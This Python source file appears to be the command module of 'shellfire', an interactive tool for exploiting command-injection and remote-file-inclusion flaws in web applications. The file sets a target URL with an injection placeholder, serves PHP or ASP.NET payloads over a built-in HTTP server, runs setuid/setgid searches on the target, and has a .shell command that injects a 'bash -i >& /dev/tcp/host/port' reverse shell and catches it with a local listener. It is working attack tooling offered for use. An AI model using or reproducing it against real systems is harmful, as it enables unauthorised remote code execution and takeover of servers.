import json
import os
import readline
import requests
import select
import socket
import sys
import threading
import time
from config import cfg, state

############################################################
## Functions

def show_help(cmd=None):
  if cmd and cmd[0:1] == '.':
    cmd = cmd[1:]
  if cmd in command_list:
    if len(command_list[cmd]["help_text"]):
      sys.stdout.write("".join(command_list[cmd]["help_text"]))
    else:
      sys.stdout.write("command doesn't have help text\n")
  else:
    sys.stdout.write("Available commands:\n")
    for cmd_key in command_list:
      sys.stdout.write("  .%s\n" % (cmd_key))


def http_server(port):
  ## super simple http. we can probably make this more robust.
  ## set up network listener first
  addr = ''
  conn = None
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.settimeout(1)
  sock.bind((addr, port))
  sock.listen(1)
  ## server loop
  while http_running == True:
    try:
      if not conn:
        conn, addr = sock.accept()
      request = conn.recv(1024)

      http_response = "HTTP/1.1 200 OK\n\n" + cfg.payload + "\n"

      ## send payload to the client
      conn.send(bytes(http_response, 'utf-8'))
      conn.close()
      conn = None
    except Exception as e:
      if args.debug:
        sys.stderr.write("[!] Err. socket.error : %s\n" % e)
      pass
  sys.stdout.write("[*] HTTP Server stopped\n")

def rev_shell(addr, port):
  ## setup listener for reverse shell
  port = int(port)
  state.revshell_running = True
  conn = None
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.bind((addr, port))
  sock.listen(1)
  conn, client_address = sock.accept()

  ## listener loop
  while True:
    socket_list = [conn, sys.stdin]
    read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])

    ## wait for connections
    for s in read_sockets:
      if s == conn:
        data = s.recv(4096)
        if not data:
          state.revshell_running = False
          return
        else:
          sys.stdout.write(data)
          sys.stdout.flush()
      else:
        msg = input()
        conn.send(msg)

  ## cleanup
  conn.close()
  state.revshell_running = False
  return

def cmd_auth(cmd):
  ## configure HTTP Basic auth settings
  if len(cmd) > 1:
    cfg.auth_user, cfg.auth_pass = cmd[2][len(cmd[0])+1:].split(":",1)
    cfg.auth = requests.auth.HTTPBasicAuth(cfg.auth_user, cfg.auth_pass)
  else:
    sys.stdout.write("[*] HTTP Auth: %s:%s\n" % (cfg.auth_user, cfg.auth_pass))
  return

def cmd_config(cmd):
  ## manage our configs
  if len(cmd) > 3:
    sys.stdout.write("[!] Invalid parameters for .config\n")
    return
  elif len(cmd) > 1:
    if len(cmd) == 3:
      name = cmd[2] + ".cfg"
    else:
      name = 'default.cfg'
    config_path = os.path.expanduser("~") + "/.config/shellfire/"
    name = config_path + name
    if cmd[1] == "save":
      ## make sure our directory exists
      if not os.path.isdir(config_path):
        os.mkdir(config_path)
      ## save our config to json
      with open(name, 'w') as my_config:
        my_config.write(cfg.dump())
        sys.stdout.write("[*] Config saved.\n")
    elif cmd[1] == "load":
      ## load json into our config
      try:
        with open(name, 'r') as my_config:
          cfg.load(json.load(my_config))
          sys.stdout.write("[*] Config restored.\n")
      except:
        sys.stdout.write("[!] Unable to restore config!\n")
  return

def cmd_cookies(cmd):
  ## configure cookies to be sent to target
  ## right now, we only parse JSON
  if len(cmd) < 2:
    sys.stdout.write("[*] cookies: %s\n" % (json.dumps(cfg.cookies)))
  else:
    try:
      cmd.pop(0)
      cfg.cookies = json.loads(" ".join(cmd))
    except Exception as e:
      sys.stderr.write("[!] %s\n" % e)
  return

def cmd_encode(cmd):
  ## if no params passed, display current encoding plugins
  if len(cmd) == 1:
    sys.stdout.write("[*] encoding: %s\n" % (' | '.join(cfg.encode_chain)))
    return
  ## Set our encoding plugins!
  ## let's remove ".encode" from our cmd
  cmd.pop(0)
  ## reset our chain
  cfg.encode_chain = []
  ## try to load our plugins
  try:
    for c in cmd:
      if c != "|" and c != "''" and c != '""':
        if c in plugins.plugins:
          cfg.encode_chain.append(c)
        else:
          cfg.encode_chain = []
          sys.stdout.write("[!] Invalid plugin %s\n" % (c))
          return
  except:
    pass
  return

def cmd_exit(cmd):
  http_running = False
  if os.path.isfile(cfg.history_file):
    readline.write_history_file(cfg.history_file)
  sys.exit(0)

def cmd_find(cmd):
  ## run "find" on remote target
  if len(cmd) != 2:
    sys.stdout.write("[!] Invalid parameters\n")
    return
  if cmd[1] == "setgid":
    state.userinput = "find / -type f -perm -02000 -ls"
  elif cmd[1] == "setuid":
    state.userinput = "find / -type f -perm -04000 -ls"
  else:
    sys.stderr.write("[!] Invalid parameters\n")
    return
  state.exec_cmd = True
  return

def cmd_help(cmd):
  if len(cmd) == 2:
    show_help(cmd[1])
  else:
    show_help()
  return

def cmd_history(cmd):
  ## configure history settings for shellfire (via readline)
  if len(cmd) == 1:
    if os.path.isfile(cfg.history_file):
      sys.stdout.write("[*] History writing is enabled\n")
    else:
      sys.stdout.write("[*] History writing is disabled\n")
  else:
    if cmd[1] == "clear":
      readline.clear_history()
      sys.stdout.write("[*] History is cleared\n")
    elif cmd[1] == "save":
      with open(cfg.history_file, 'a'):
        os.utime(cfg.history_file, None)
      sys.stdout.write("[*] History writing is enabled\n")
    elif cmd[1] == "nosave":
      os.remove(cfg.history_file)
      sys.stdout.write("[*] History writing is disabled\n")
  return

def cmd_http(cmd):
  ## control our local http server
  global http_running
  if len(cmd) == 1:
    if http_running == True:
      sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
      sys.stdout.write("[*] HTTP payload: %s\n" % cfg.payload_type)
    else:
      sys.stdout.write("[*] HTTP server is not running\n")
    return
  if cmd[1] == "start":
    if http_running == False:
      if len(cmd) > 2:
        try:
          cfg.http_port = int(cmd[2])
        except Exception as e:
          sys.stderr.write("[!] Invalid port value: %s\n" % (cmd[2]))
          return
      s = threading.Thread(target=http_server, args=(cfg.http_port,))
      s.start()
      http_running = True
      sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
    else:
      sys.stderr.write("[!] HTTP server already running\n")
  elif cmd[1] == "stop":
    if http_running == True:
      http_running = False
      time.sleep(1)
    else:
      sys.stderr.write("[!] HTTP server already stopped\n")
  elif cmd[1] == "payload":
    if cmd[2] == "aspnet":
      payload_aspnet()
    elif cmd[2] == "php":
      payload_php()
    else:
      sys.stderr.write("[!] Unrecognized payload type\n")
      return
    sys.stdout.write("[*] HTTP payload set: %s\n" % cfg.payload_type)
  return

def cmd_marker(cmd):
  ## set the marker for our rce payloads
  ## this will determine boundaries to split and clean output
  if len(cmd) != 2:
    sys.stderr.write("[!] Invalid parameters\n")
    return
  cfg.marker = cmd[1]
  sys.stdout.write("[*] Payload output marker set\n")
  return

def cmd_method(cmd):
  ## configure HTTP method to use against the target
  if len(cmd) > 2:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .method <method>\n")
    return
  if len(cmd) == 2:
    if cmd[1] == "post":
      cfg.method = "post"
    else:
      cfg.method = "get"
  sys.stdout.write("[*] HTTP method set: %s\n" % cfg.method.upper())
  return

def cmd_phpinfo(cmd):
  ## trigger phpinfo payload
  state.userinput = "_show_phpinfo"
  state.exec_cmd = True
  return

def cmd_post(cmd):
  ## configure POST data to send
  if len(cmd) < 2:
    cfg.post = {}
  else:
    cmd.pop(0)
    cfg.post = json.loads(" ".join(cmd))
  sys.stdout.write("[*] POST data set: %s\n" % cfg.post)
  return

def cmd_referer(cmd):
  ## set HTTP referer
  if len(cmd) > 1:
    cmd.pop(0)
    cfg.headers['Referer'] = " ".join(cmd)
  sys.stdout.write("[*] Referer set: %s\n" % cfg.headers['Referer'])
  return

def cmd_headers(cmd):
  """List or configure the HTTP request headers
    .headers
    .headers default
    .headers {"X-EXAMPLE-HEADER": "SomeValueHere" }
  Args:
      cmd (Str): "default" to reset the headers, otherwise a JSON string of the preferred header set
  """
  if len(cmd) < 1:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .headers {\"X-EXAMPLE\": \"some_value_here\"}\n")
    sys.stderr.write("    .headers default\n")
    return
  elif len(cmd) == 1:
    sys.stdout.write("[*] Request headers are: \n")
    sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
    return
  try:
    cmd.pop(0)
    if "".join(cmd).strip() == "default":
      # Apply the default headers here
      cfg.headers = cfg.default_headers
      sys.stdout.write("[*] Set request headers back to default...\n")
    else:
      # Convert deserialize the json
      tmp_headers = json.loads(" ".join(cmd))
      
      # Upsert into cfg.headers
      for header in tmp_headers:
        if header not in cfg.headers:
          cfg.headers[header] = tmp_headers[header]
        else:
          if cfg.headers[header] != tmp_headers[header]:
            cfg.headers[header] = tmp_headers[header]
      
      # Sanity check
      sys.stdout.write("[*] Request headers are now: \n")
      sys.stdout.write(json.dumps(cfg.headers, indent=4) + "\n")
  except Exception as e:
    sys.stderr.write("[!] %s\n" % e)


def cmd_shell(cmd):
  ## initiate a reverse shell via rce
  if len(cmd) != 3:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .shell <ip_address> <port>\n")
    return
  sys.stdout.write("[*] Initiating reverse shell...\n")
  host = cmd[1]
  port = cmd[2]
  state.userinput = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"

  # open our reverse shell in a new thread
  s = threading.Thread(target=rev_shell, args=(host, port))
  s.start()

  # make sure the thread is init before proceeding
  time.sleep(1)

  state.exec_cmd = True
  return

def cmd_url(cmd):
  ## set URL for remote target
  if len(cmd) > 1:
    cfg.url = state.userinput[len(cmd[0])+1:]
  sys.stdout.write("[*] Exploit URL set: %s\n" % cfg.url)
  return

def cmd_useragent(cmd):
  ## set the user agenet to send to target
  if len(cmd) > 1:
    cfg.headers['User-Agent'] = state.userinput[len(cmd[0])+1:]
  sys.stdout.write("[*] User-Agent set: %s\n" % cfg.headers['User-Agent'])
  return

############################################################
## ommand list
"""Data structure of all available shellfire commands.
"""
command_list = {
  "auth": {
    "func": cmd_auth,
    "description": "",
    "help_text": [
      ".auth - show current HTTP Auth credentials\n",
      ".auth <username>:<password> - set the HTTP Auth credentials\n",
    ],
  },
  "config": {
    "func": cmd_config,
    "description": "",
    "help_text": [
      ".config save [name] - save a named config\n",
      ".config load [name] - load a named config\n",
    ],
  },
  "cookies": {
    "func": cmd_cookies,
    "description": "",
    "help_text": [
      ".cookies - show current cookies to be sent with each request\n",
      ".cookies <json> - a json string representing cookies you wish to send\n",
    ],
  },
  "encode": {
    "func": cmd_encode,
    "description": "",
    "help_text": [
      ".encode - show current encoding used before sending commands\n",
      ".encode base64 - encode commands with base64 before sending\n",
      ".encode none - do not encode commands before sending\n",
    ],
  },
  "exit": {
    "func": cmd_exit,
    "description": "",
    "help_text": [
      ".exit - exits this program\n"
    ],
  },
  "find": {
    "func": cmd_find,
    "description": "",
    "help_text": [
      ".find setuid - search for setuid files\n",
      ".find setgid - search for setgid files\n",
    ],
  },
  "help": {
    "func": cmd_help,
    "description": "",
    "help_text": [
      ".help - prints all help topics\n"
    ],
  },
  "history": {
    "func": cmd_history,
    "description": "",
    "help_text": [
      ".history clear - erase history\n",
      ".history nosave - do not write history file\n",
      ".history save - write history file on exit\n",
    ],
  },
  "http": {
    "func": cmd_http,
    "description": "",
    "help_text": [
      ".http - show status of HTTP server\n",
      ".http payload [type] - set the payload to be used for RFI\n",
      "                       supported payload types:\n",
      "                       aspnet\n",
      "                       php\n",
      ".http start [port] - start HTTP server\n",
      ".http stop - stop HTTP server\n",
    ],
  },
  "marker": {
    "func": cmd_marker,
    "description": "",
    "help_text": [
      ".marker <string> - set the payload output marker to string.\n",
    ],
  },
  "method": {
    "func": cmd_method,
    "description": "",
    "help_text": [
      ".method - show current HTTP method\n",
      ".method get - set HTTP method to GET\n",
      ".method post - set HTTP method to POST\n",
    ],
  },
  "phpinfo": {
    "func": cmd_phpinfo,
    "description": "",
    "help_text": [
      ".phpinfo - executes the '_show_phpinfo' command via the PHP payload"
    ],
  },
  "post": {
    "func": cmd_post,
    "description": "",
    "help_text": [
      ".post <json> - a json string representing post data you wish to send\n",
    ]
  },
  "referer": {
    "func": cmd_referer,
    "description": "",
    "help_text": [
      ".referer - show the HTTP referer string\n",
      ".referer <string> - set the value for HTTP referer\n",
    ],
  },
  "headers": {
    "func": cmd_headers,
    "description": "",
    "help_text": [
      ".headers default - sets the headers back to the shellfire defaults\n",
      ".headers {\"X-EXAMPLE\": \"some_value_here\"} - upserts the headers in the JSON object to the header config\n",
    ],
  },
  "shell": {
    "func": cmd_shell,
    "description": "",
    "help_text": [
      ".shell <ip_address> <port> - initiate reverse shell to target\n",
    ]
  },
  "url": {
    "func": cmd_url,
    "description": "",
    "help_text": [
      ".url <string> - set the target URL to string. Use '{}' to specify where command injection goes.\n",
      "                if {} is not set, 'cmd' param will automatically be appended.\n",
    ],
  },
  "useragent": {
    "func": cmd_useragent,
    "description": "",
    "help_text": [
      ".useragent - show the User-Agent string\n",
      ".useragent <string> - set the value for User-Agent\n",
    ],
  },
  "quit": {
    "func": cmd_exit,
    "description": "Alias of \".exit\"",
    "help_text": [
      ".quit - exits this program\n"
    ],
  },
}
